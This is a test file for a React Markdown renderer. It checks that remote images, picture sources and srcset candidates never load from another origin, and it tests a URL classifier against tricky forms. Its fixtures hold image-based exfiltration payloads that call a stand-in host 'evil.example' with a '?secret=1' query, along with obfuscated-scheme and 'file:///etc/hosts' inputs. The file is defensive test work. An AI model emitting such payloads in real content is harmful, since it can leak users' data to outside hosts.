// @vitest-environment happy-dom
import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import { Markdown } from "./markdown";
import { isRemoteUrl } from "./remote-resources";

afterEach(cleanup);

/** Every URL an element in `root` would load as it renders. */
const loaded = (root: Element) =>
  [...root.querySelectorAll("[src], [srcset], [poster], link[href]")].flatMap((element) =>
    ["src", "srcset", "poster", "href"].flatMap((name) => element.getAttribute(name) ?? []),
  );

const REMOTE = [
  "![leak](https://evil.example/a.png?secret=1)",
  "![](//evil.example/b.png)",
  '<img src="https://evil.example/c.png" alt="c">',
  '<picture><source srcset="https://evil.example/d.png 1x, /ok.png 2x"><img src="https://evil.example/e.png"></picture>',
  '<img src="/local.png" srcset="https://evil.example/f.png 2x">',
].join("\n\n");

describe("markdown never loads another origin", () => {
  it("renders remote images, pictures and candidates as inert text, in the default chain", () => {
    const { container } = render(<Markdown mode="static">{REMOTE}</Markdown>);
    expect(loaded(container).filter((url) => url.includes("evil.example"))).toEqual([]);
    expect(container.textContent).toContain("[leak]");
    expect(container.querySelectorAll("source")).toHaveLength(0);
  });

  it("holds for a chain its caller built, as the Files preview does", () => {
    const { container } = render(
      <Markdown mode="static" rehypePlugins={(defaults) => [defaults.raw!, defaults.sanitize!]}>
        {REMOTE}
      </Markdown>,
    );
    expect(loaded(container).filter((url) => url.includes("evil.example"))).toEqual([]);
  });
});

describe("isRemoteUrl", () => {
  it.each([
    ["https://a.example/x.png", true],
    ["HTTP://a.example/x.png", true],
    ["//a.example/x.png", true],
    ["\\\\a.example/x.png", true],
    [" ht\ttps://a.example/x.png", true],
    ["file:///etc/hosts", true],
    ["data:image/png;base64,AAAA", false],
    ["blob:http://localhost/1", false],
    ["/x.png", false],
    ["../x.png", false],
    ["x.png", false],
  ])("%s → %s", (url, expected) => {
    expect(isRemoteUrl(url)).toBe(expected);
  });
});
